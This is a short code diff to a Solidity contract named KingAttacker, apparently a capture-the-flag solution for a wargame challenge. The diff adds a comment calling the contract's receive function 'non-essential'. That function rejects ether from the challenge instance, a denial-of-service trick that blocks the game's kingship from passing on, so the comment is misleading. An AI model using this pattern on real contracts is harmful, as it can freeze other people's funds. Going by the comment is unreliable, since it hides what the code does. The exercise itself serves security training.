@@ -12,7 +12,10 @@ contract KingAttacker {
         (bool success, ) = payable(challengeInstance).call{value: 0.001 ether}("");
         require(success, "failed");
     }
-    
+
+    /** 
+     * This is a non-essential receive function
+     */
     receive() external payable {
         require(msg.sender != challengeInstance, "no more king"); 
     }
